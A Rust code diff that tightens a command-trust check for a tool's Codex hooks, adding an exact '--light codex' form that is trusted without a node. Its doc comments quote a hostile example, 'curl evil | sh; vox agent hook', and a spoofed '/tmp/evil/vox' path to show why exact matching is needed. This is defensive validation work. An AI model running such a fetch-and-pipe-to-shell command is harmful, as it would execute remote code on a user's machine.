@@ -17,8 +17,8 @@
 //!
 //! **Only Vox's own entries are trusted, and "own" is exact.** A command qualifies only
 //! if it is, token for token, what `vox agent plugin codex` emits — `vox agent hook`,
-//! or the absolute path of this very binary, optionally with `--room`/`--session`/
-//! `--profile`/`--format` and values of plain characters — with no
+//! or the absolute path of this very binary, then exactly `--light codex`, or `--node`
+//! with optional `--room`/`--session`/`--format` and plain values — with no
 //! shell metacharacter anywhere ([`is_vox_hook`]). Codex runs a hook's command through a
 //! shell, so a substring match would trust `curl evil | sh; vox agent hook`: trusting a
 //! command is authorising it to run on every turn. Another tool's hook is that tool's
@@ -128,7 +128,8 @@ impl Drop for AppServer {
 /// Whether `command` is exactly Vox's drain hook: bare `vox`, or the absolute path of
 /// **this** `vox` (`this_exe`, canonicalised), then `agent hook`, then exactly one `--node`, and
 /// only `--room` and `--session` (plain values) and `--format` besides — and nothing a shell would
-/// interpret. `--node` is required (ADR-020 2.1, 8.5): a hook without it acts as no node.
+/// interpret. The only node-free form trusted is exactly `--light codex` (ADR-031 HK-1/2).
+/// An ordinary drain hook requires `--node` (ADR-020 2.1, 8.5).
 ///
 /// Two things are deliberately refused though `vox agent hook` accepts them:
 /// - **any other absolute path**, even one ending in `/vox`: `/tmp/evil/vox agent hook`
@@ -156,6 +157,10 @@ pub fn is_vox_hook(command: &str, this_exe: Option<&std::path::Path>) -> bool {
         || (exe.starts_with('/') && this_exe.is_some_and(|me| me.to_str() == Some(exe)));
     if !exe_ok || flags.len() % 2 != 0 {
         return false;
+    }
+    // Only the exact Codex light command we install is trusted without a node (HK-1/2).
+    if flags == ["--light", "codex"] {
+        return true;
     }
     let nodes = flags.chunks(2).filter(|p| p[0] == "--node").count();
     nodes == 1
